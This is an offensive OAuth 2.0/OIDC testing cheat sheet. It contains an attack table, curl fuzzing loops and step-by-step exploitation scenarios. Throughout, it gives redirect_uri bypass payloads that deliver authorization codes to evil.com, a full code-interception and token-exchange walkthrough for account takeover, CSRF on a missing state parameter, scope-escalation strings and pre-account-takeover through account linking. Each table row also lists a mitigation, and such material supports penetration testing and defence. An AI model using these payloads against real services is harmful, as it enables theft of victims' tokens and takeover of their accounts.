# OAUTH 2.0 / OIDC — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **redirect_uri Bypass** | redirect_uri in request | `curl /oauth/auth?redirect_uri=https://evil.com` | Code sent to evil | URL whitelist |
| **Open Redirect in URI** | Valid domain with open path | `curl /oauth/auth?redirect_uri=https://valid.com//evil.com` | Redirects to evil | Path validated |
| **Missing state** | OAuth callback | `curl /oauth/callback?code=X` without nonce | Token exchanged | state required |
| **CSRF state** | Predictable state | `curl /oauth/callback?code=STOLEN&state=123` | Token bound to attacker | Random state |
| **PKCE Downgrade** | PKCE optional | Omit code_challenge from auth request + code_verifier from token request | Token issued | PKCE required |
| **code Reuse** | auth code used twice | `curl /oauth/token -d 'code=XYZ'` ×2 | Both succeed | code single-use |
| **Token in Referrer** | OAuth in browser | Check Referrer header on redirect | Token leaked via Referrer | Referrer-Policy set |

## CURL
```bash
# redirect_uri fuzzing
for uri in \
  "https://evil.com" \
  "https://target.com.evil.com" \
  "https://target.com//evil.com" \
  "https://target.com/redirect?url=https://evil.com" \
  "https://target.com@evil.com" \
  "https://evil.com#@target.com"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "/oauth/authorize?client_id=X&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$uri'))")&response_type=code")
  echo "$uri → $code"
done

# State prediction test
# Capture state values across multiple auth requests
for i in {1..5}; do
  curl -s "/oauth/authorize?client_id=X&redirect_uri=https://target.com/cb&response_type=code" \
    | grep -oP 'state=[a-f0-9]+' | cut -d= -f2
done
# If state is sequential/timestamp/predictable → CSRF

# Code reuse test
code=$(curl -s -X GET "/oauth/authorize?client_id=X&response_type=code&redirect_uri=...&state=123" \
  -b "session=A" | grep -oP 'code=[^&]+')
curl -X POST /oauth/token -d "grant_type=authorization_code&code=$code&redirect_uri=..."
curl -X POST /oauth/token -d "grant_type=authorization_code&code=$code&redirect_uri=..."  # Reuse
```

## DECISION TREE
```
Found OAuth flow?
├─ redirect_uri validation?
│  ├─ Any URL → TOKEN THEFT (send code to evil.com)
│  ├─ Substring match → BYPASS (target.com.evil.com)
│  └─ Exact match → STRONG
├─ state parameter?
│  ├─ Missing → CSRF on token binding
│  ├─ Predictable → CSRF (forge auth request, steal resulting code)
│  └─ Random → SAFE
├─ PKCE enforced?
│  ├─ Optional → CODE INTERCEPTION (omit verifier, capture code)
│  └─ Required → SAFE
└─ Auth code single-use?
   ├─ Reusable → CODE THEFT (intercept one code, use multiple times)
   └─ Single-use → SAFE
```

## CHAIN
OAuth redirect + Open Redirect = Token theft (CVSS 8.0+)
OAuth CSRF + XSS = Account takeover via token binding

## PRACTICAL ATTACK SCENARIOS

### redirect_uri Manipulation
```bash
# Strict match bypass attempts
# Try each on the authorization endpoint:
/oauth/authorize?client_id=X&redirect_uri=https://target.com/callback/../evil
/oauth/authorize?client_id=X&redirect_uri=https://target.com/callback%2F..%2Fevil
/oauth/authorize?client_id=X&redirect_uri=https://target.com.evil.com/callback
/oauth/authorize?client_id=X&redirect_uri=https://evil.com%23.target.com/callback
/oauth/authorize?client_id=X&redirect_uri=https://evil.com%3F.target.com/callback

# Open redirect chain
/oauth/authorize?client_id=X&redirect_uri=https://target.com/redirect?to=https://evil.com

# Path traversal
/oauth/authorize?client_id=X&redirect_uri=https://target.com/callback/../../admin

# Subdomain takeover variant
/oauth/authorize?client_id=X&redirect_uri=https://sub.target.com/callback
```

### Full redirect_uri Exploitation
```bash
# 1. Attacker crafts URL:
https://target.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://evil.com&response_type=code&scope=openid+profile

# 2. Send to victim (phishing link or CSRF if state missing)
# 3. Victim authorizes → authorization code lands at:
https://evil.com/callback?code=AUTH_CODE_123

# 4. Attacker exchanges code for token:
POST /oauth/token HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=AUTH_CODE_123
&client_id=APP_ID
&client_secret=APP_SECRET  (or omit if public client)
&redirect_uri=https://evil.com

# 5. Use token to access victim's account → FULL ATO
```

### CSRF on OAuth (Missing state)
```bash
# Test if state parameter is validated
# 1. Start OAuth flow → capture authorization URL
# 2. Modify or remove state parameter
# 3. If accepted → CSRF vulnerability

# Exploitation = attacker links their account to victim's:
# Attacker starts OAuth → pauses → sends URL to victim
# Victim authorizes → code goes to attacker's redirect_uri
```

### Scope Escalation
```bash
# Request elevated scopes during authorization
scope=read+write+admin+delete
scope=user:read%20admin:all%20repo
scope=openid+profile+email+admin+offline_access

# Check if scope validation happens server-side
# Some servers grant all requested scopes
```

### Account Linking Abuse (Pre-ATO)
```bash
# 1. Register account with victim@example.com (before victim does)
# 2. Link attacker's Google OAuth to this account
# 3. If no verification that email owner = OAuth owner → compromise
# 4. When victim signs up via OAuth later → logs into attacker's account
```

### Open Redirect → OAuth Chain
```bash
# Pattern: redirect_uri must be on target.com
# Target has: /go?url=https://evil.com (open redirect)
# Chain: redirect_uri=https://target.com/go?url=https://evil.com
# Auth server sees: ✓ domain is target.com
# After auth: code delivered to evil.com
```
